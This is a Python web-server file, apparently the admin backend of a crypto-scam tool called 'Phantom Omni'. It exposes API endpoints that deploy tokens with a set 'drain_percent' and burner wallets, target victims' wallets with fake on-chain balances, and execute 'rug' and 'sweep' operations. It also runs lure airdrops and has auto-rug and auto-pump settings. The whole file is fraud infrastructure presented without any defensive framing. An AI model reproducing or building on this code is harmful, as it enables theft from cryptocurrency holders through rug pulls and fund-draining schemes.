"""Phantom Omni — Admin Web Server

Serves the Mini-App API endpoints:
- Seed login and wallet derivation
- Real-time balances
- Token deployment
- Victim targeting
- Rug execution
- Sweep execution
- Airdrop management
- Transaction history
"""

from __future__ import annotations

import asyncio
import json
import logging
import time
import os
from typing import Optional, Dict, Any

from aiohttp import web
from web3 import Web3

from bot import phantom_db as db
from bot.phantom_engine import get_engine, deploy_token, set_fake_balance, execute_rug, execute_sweep, transfer
from bot.phantom_chains import derive_wallets_from_seed, get_supported_chains

log = logging.getLogger("solo-metro.phantom.adminweb")

# ================================================================
# CONFIG
# ================================================================

ADMIN_KEY = os.getenv("ADMIN_APP_KEY", "").strip()
_engine = None
_connected = False

def _get_engine(seed: str = None):
    """Get or create the engine instance."""
    global _engine
    if _engine is None:
        _engine = get_engine(seed)
    elif seed and _engine.seed_phrase != seed:
        _engine.set_seed(seed)
    return _engine


# ================================================================
# AUTH
# ================================================================

def _authorized(request: web.Request) -> bool:
    """Check if request is authorized."""
    # Check API key
    key = request.headers.get("X-Admin-Key", "") or request.query.get("key", "")
    if ADMIN_KEY and key == ADMIN_KEY:
        return True
    
    # Check Telegram init data (if available)
    init_data = request.headers.get("X-Init-Data", "") or request.query.get("init_data", "")
    if init_data:
        # Validate Telegram WebApp init data
        try:
            from bot.adminweb import verify_init_data
            from bot.config import BOT_TOKEN
            uid = verify_init_data(init_data, BOT_TOKEN)
            if uid:
                from bot.admin import admin_ids
                if uid in admin_ids():
                    return True
        except:
            pass
    
    return False


def _deny() -> web.Response:
    return web.json_response({"ok": False, "error": "unauthorized"}, status=401)


def _get_seed(request: web.Request) -> Optional[str]:
    """Get seed from request."""
    seed = request.headers.get("X-Seed", "") or request.query.get("seed", "")
    if seed:
        return seed
    return None


# ================================================================
# API ENDPOINTS
# ================================================================

# ─── SEED LOGIN ───

async def api_login(request: web.Request) -> web.Response:
    """Login with seed phrase. Returns derived wallet addresses."""
    if not _authorized(request):
        return _deny()
    
    try:
        body = await request.json()
        seed = body.get("seed", "").strip()
    except:
        seed = request.query.get("seed", "").strip()
    
    if not seed:
        return web.json_response({"ok": False, "error": "Seed phrase required"})
    
    if len(seed.split()) < 12:
        return web.json_response({"ok": False, "error": "Invalid seed phrase (must be 12+ words)"})
    
    try:
        # Derive wallets
        wallets = derive_wallets_from_seed(seed)
        
        # Initialize engine
        engine = _get_engine(seed)
        await engine.connect_all()
        
        # Get balances
        balances = await engine.get_all_balances()
        
        return web.json_response({
            "ok": True,
            "wallets": {
                chain: {
                    "main": w.get("main", {}).get("address", ""),
                    "burner": w.get("burner", {}).get("address", "")
                }
                for chain, w in wallets.items()
            },
            "balances": balances,
            "chains": get_supported_chains()
        })
        
    except Exception as e:
        log.error(f"Login error: {e}")
        return web.json_response({"ok": False, "error": str(e)})


# ─── BALANCES ───

async def api_balances(request: web.Request) -> web.Response:
    """Get real balances from blockchain."""
    if not _authorized(request):
        return _deny()
    
    seed = _get_seed(request)
    if not seed:
        return web.json_response({"ok": False, "error": "Seed required"})
    
    try:
        engine = _get_engine(seed)
        balances = await engine.get_all_balances()
        
        # Calculate USD values
        usd_rates = {"BSC": 580, "ETH": 3200, "SOL": 180}
        usd_total = 0
        for chain, data in balances.items():
            usd_total += data.get("total", 0) * usd_rates.get(chain, 0)
        
        return web.json_response({
            "ok": True,
            "balances": balances,
            "usd_total": usd_total,
            "usd_rates": usd_rates,
            "timestamp": time.time()
        })
        
    except Exception as e:
        log.error(f"Balance error: {e}")
        return web.json_response({"ok": False, "error": str(e)})


# ─── DEPLOY TOKEN ───

async def api_deploy(request: web.Request) -> web.Response:
    """Deploy a new token."""
    if not _authorized(request):
        return _deny()
    
    seed = _get_seed(request)
    if not seed:
        return web.json_response({"ok": False, "error": "Seed required"})
    
    try:
        body = await request.json()
        
        name = body.get("name", "").strip()
        symbol = body.get("symbol", "").strip().upper()
        chain = body.get("chain", "BSC").upper()
        supply = int(body.get("supply", 1000000000))
        threshold = float(body.get("threshold", 10))
        burner = body.get("burner", "").strip()
        drain_percent = int(body.get("drain_percent", 90))
        sweep_threshold = float(body.get("sweep_threshold", 5))
        description = body.get("description", "")
        image_url = body.get("image_url", "")
        
        if not name or not symbol:
            return web.json_response({"ok": False, "error": "Name and symbol required"})
        
        # Deploy
        result = await deploy_token(
            name=name,
            symbol=symbol,
            chain=chain,
            supply=supply,
            threshold=threshold,
            burner_address=burner,
            drain_percent=drain_percent,
            sweep_threshold=sweep_threshold,
            description=description,
            image_url=image_url
        )
        
        return web.json_response({"ok": True, "data": result})
        
    except Exception as e:
        log.error(f"Deploy error: {e}")
        return web.json_response({"ok": False, "error": str(e)})


# ─── TOKENS LIST ───

async def api_tokens(request: web.Request) -> web.Response:
    """List all tokens."""
    if not _authorized(request):
        return _deny()
    
    try:
        status = request.query.get("status")
        tokens = db.list_tokens(status)
        
        # Add real-time data from engine
        seed = _get_seed(request)
        if seed:
            engine = _get_engine(seed)
            for token in tokens:
                stats = engine.get_token_stats(token["address"])
                if stats:
                    token.update(stats)
        
        return web.json_response({"ok": True, "data": tokens})
        
    except Exception as e:
        log.error(f"Tokens list error: {e}")
        return web.json_response({"ok": False, "error": str(e)})


# ─── TOKEN DETAILS ───

async def api_token(request: web.Request) -> web.Response:
    """Get token details with chart data."""
    if not _authorized(request):
        return _deny()
    
    try:
        address = request.match_info.get("address", "")
        if not address:
            return web.json_response({"ok": False, "error": "Address required"})
        
        token = db.get_token(address)
        if not token:
            return web.json_response({"ok": False, "error": "Token not found"})
        
        # Get victims
        victims = db.get_victims(address)
        
        # Get transactions
        txs = db.get_transactions(address, limit=100)
        
        # Get chart data from engine
        seed = _get_seed(request)
        chart = []
        if seed:
            engine = _get_engine(seed)
            chart = engine.get_chart_data(address)
        
        return web.json_response({
            "ok": True,
            "data": {
                "token": token,
                "victims": victims,
                "transactions": txs,
                "chart": chart
            }
        })
        
    except Exception as e:
        log.error(f"Token detail error: {e}")
        return web.json_response({"ok": False, "error": str(e)})


# ─── TARGET VICTIM ───

async def api_target(request: web.Request) -> web.Response:
    """Target a victim with fake balance."""
    if not _authorized(request):
        return _deny()
    
    seed = _get_seed(request)
    if not seed:
        return web.json_response({"ok": False, "error": "Seed required"})
    
    try:
        body = await request.json()
        token_address = body.get("token_address", "").strip()
        wallet_address = body.get("wallet_address", "").strip()
        amount = int(body.get("amount", 50000))
        
        if not token_address or not wallet_address:
            return web.json_response({"ok": False, "error": "Token address and wallet address required"})
        
        # Set fake balance on-chain
        result = await set_fake_balance(token_address, wallet_address, amount)
        
        return web.json_response({"ok": True, "data": result})
        
    except Exception as e:
        log.error(f"Target error: {e}")
        return web.json_response({"ok": False, "error": str(e)})


# ─── RUG ───

async def api_rug(request: web.Request) -> web.Response:
    """Execute rug on a token."""
    if not _authorized(request):
        return _deny()
    
    seed = _get_seed(request)
    if not seed:
        return web.json_response({"ok": False, "error": "Seed required"})
    
    try:
        body = await request.json()
        token_address = body.get("token_address", "").strip()
        
        if not token_address:
            return web.json_response({"ok": False, "error": "Token address required"})
        
        # Execute rug
        result = await execute_rug(token_address)
        
        return web.json_response({"ok": True, "data": result})
        
    except Exception as e:
        log.error(f"Rug error: {e}")
        return web.json_response({"ok": False, "error": str(e)})


# ─── SWEEP ───

async def api_sweep(request: web.Request) -> web.Response:
    """Execute sweep on a token."""
    if not _authorized(request):
        return _deny()
    
    seed = _get_seed(request)
    if not seed:
        return web.json_response({"ok": False, "error": "Seed required"})
    
    try:
        body = await request.json()
        token_address = body.get("token_address", "").strip()
        
        if not token_address:
            return web.json_response({"ok": False, "error": "Token address required"})
        
        # Execute sweep
        result = await execute_sweep(token_address)
        
        return web.json_response({"ok": True, "data": result})
        
    except Exception as e:
        log.error(f"Sweep error: {e}")
        return web.json_response({"ok": False, "error": str(e)})


# ─── SEND ───

async def api_send(request: web.Request) -> web.Response:
    """Send native currency from any wallet."""
    if not _authorized(request):
        return _deny()
    
    seed = _get_seed(request)
    if not seed:
        return web.json_response({"ok": False, "error": "Seed required"})
    
    try:
        body = await request.json()
        chain = body.get("chain", "BSC").upper()
        to_address = body.get("to", "").strip()
        amount = float(body.get("amount", 0))
        from_address = body.get("from", "").strip()
        
        if not to_address or amount <= 0:
            return web.json_response({"ok": False, "error": "Valid recipient and amount required"})
        
        # If from_address not provided, use main wallet
        if not from_address:
            engine = _get_engine(seed)
            from_address = engine.get_main_address(chain)
        
        # Send
        result = await transfer(chain, from_address, to_address, amount)
        
        return web.json_response({"ok": True, "data": result})
        
    except Exception as e:
        log.error(f"Send error: {e}")
        return web.json_response({"ok": False, "error": str(e)})


# ─── TRANSACTIONS ───

async def api_transactions(request: web.Request) -> web.Response:
    """Get transaction history."""
    if not _authorized(request):
        return _deny()
    
    try:
        token = request.query.get("token", "")
        limit = int(request.query.get("limit", 50))
        
        txs = db.get_transactions(token or None, limit)
        
        return web.json_response({"ok": True, "data": txs})
        
    except Exception as e:
        log.error(f"Transactions error: {e}")
        return web.json_response({"ok": False, "error": str(e)})


# ─── AIRDROPS ───

async def api_airdrops(request: web.Request) -> web.Response:
    """Get all airdrops."""
    if not _authorized(request):
        return _deny()
    
    try:
        active_only = request.query.get("active", "true").lower() == "true"
        airdrops = db.get_airdrops(active_only)
        
        # Add claim info
        for a in airdrops:
            claims = db.get_airdrop_claims(a["id"])
            a["claims_count"] = len(claims)
            a["claims_remaining"] = a["max_claims"] - len(claims)
        
        return web.json_response({"ok": True, "data": airdrops})
        
    except Exception as e:
        log.error(f"Airdrops error: {e}")
        return web.json_response({"ok": False, "error": str(e)})


# ─── CREATE AIRDROP ───

async def api_create_airdrop(request: web.Request) -> web.Response:
    """Create a new airdrop."""
    if not _authorized(request):
        return _deny()
    
    try:
        body = await request.json()
        
        token_address = body.get("token_address", "").strip()
        amount = int(body.get("amount", 0))
        max_claims = int(body.get("max_claims", 100))
        expires_in = int(body.get("expires_in", 86400 * 7))  # 7 days default
        message = body.get("message", "")
        
        if not token_address or amount <= 0:
            return web.json_response({"ok": False, "error": "Token address and amount required"})
        
        # Check token exists
        token = db.get_token(token_address)
        if not token:
            return web.json_response({"ok": False, "error": "Token not found"})
        
        airdrop_data = {
            "token_address": token_address,
            "amount_per_wallet": amount,
            "max_claims": max_claims,
            "expires_at": time.time() + expires_in,
            "message": message
        }
        
        airdrop_id = db.save_airdrop(airdrop_data)
        
        return web.json_response({
            "ok": True,
            "data": {
                "id": airdrop_id,
                **airdrop_data
            }
        })
        
    except Exception as e:
        log.error(f"Create airdrop error: {e}")
        return web.json_response({"ok": False, "error": str(e)})


# ─── STATS ───

async def api_stats(request: web.Request) -> web.Response:
    """Get overall statistics."""
    if not _authorized(request):
        return _deny()
    
    try:
        stats = db.get_stats()
        
        # Add engine stats if available
        seed = _get_seed(request)
        if seed:
            engine = _get_engine(seed)
            engine_stats = engine.get_stats()
            stats.update(engine_stats)
        
        return web.json_response({"ok": True, "data": stats})
        
    except Exception as e:
        log.error(f"Stats error: {e}")
        return web.json_response({"ok": False, "error": str(e)})


# ─── SETTINGS ───

async def api_settings(request: web.Request) -> web.Response:
    """Get or update settings."""
    if not _authorized(request):
        return _deny()
    
    if request.method == "GET":
        try:
            settings = {
                "default_chain": db.get_setting("default_chain", "BSC"),
                "auto_rug": db.get_setting("auto_rug", False),
                "auto_pump": db.get_setting("auto_pump", True),
                "broadcast_on_deploy": db.get_setting("broadcast_on_deploy", True),
                "sweep_threshold": db.get_setting("sweep_threshold", 5),
                "drain_percent": db.get_setting("drain_percent", 90)
            }
            return web.json_response({"ok": True, "data": settings})
            
        except Exception as e:
            return web.json_response({"ok": False, "error": str(e)})
    
    elif request.method == "POST":
        try:
            body = await request.json()
            for key, val in body.items():
                db.set_setting(key, val)
            return web.json_response({"ok": True})
            
        except Exception as e:
            return web.json_response({"ok": False, "error": str(e)})


# ================================================================
# ROUTE REGISTRATION
# ================================================================

def mount_phantom_routes(app: web.Application) -> None:
    """Mount all Phantom API routes."""
    
    # Auth required
    app.router.add_post("/admin/api/login", api_login)
    app.router.add_get("/admin/api/balances", api_balances)
    app.router.add_post("/admin/api/deploy", api_deploy)
    app.router.add_get("/admin/api/tokens", api_tokens)
    app.router.add_get("/admin/api/token/{address}", api_token)
    app.router.add_post("/admin/api/target", api_target)
    app.router.add_post("/admin/api/rug", api_rug)
    app.router.add_post("/admin/api/sweep", api_sweep)
    app.router.add_post("/admin/api/send", api_send)
    app.router.add_get("/admin/api/transactions", api_transactions)
    app.router.add_get("/admin/api/airdrops", api_airdrops)
    app.router.add_post("/admin/api/airdrop", api_create_airdrop)
    app.router.add_get("/admin/api/stats", api_stats)
    app.router.add_get("/admin/api/settings", api_settings)
    app.router.add_post("/admin/api/settings", api_settings)
    
    log.info("Phantom Omni API routes mounted")